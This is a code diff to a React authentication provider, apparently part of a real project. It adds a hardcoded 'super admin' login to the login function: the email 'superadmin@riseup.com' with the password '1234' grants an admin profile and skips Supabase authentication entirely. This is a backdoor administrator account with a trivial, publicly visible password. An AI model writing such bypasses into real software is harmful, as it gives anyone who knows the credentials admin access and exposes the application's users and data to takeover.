@@ -74,6 +74,20 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
   }, []);
 
   const login = async (email: string, password: string) => {
+    // Super admin check
+    if (email === 'superadmin@riseup.com' && password === '1234') {
+      // Set super admin session
+      const superAdminProfile = {
+        id: 'super-admin',
+        email: 'superadmin@riseup.com',
+        first_name: 'Super',
+        last_name: 'Admin',
+        user_role: 'admin'
+      };
+      setProfile(superAdminProfile);
+      return;
+    }
+
     const { data, error } = await supabase.auth.signInWithPassword({
       email,
       password,
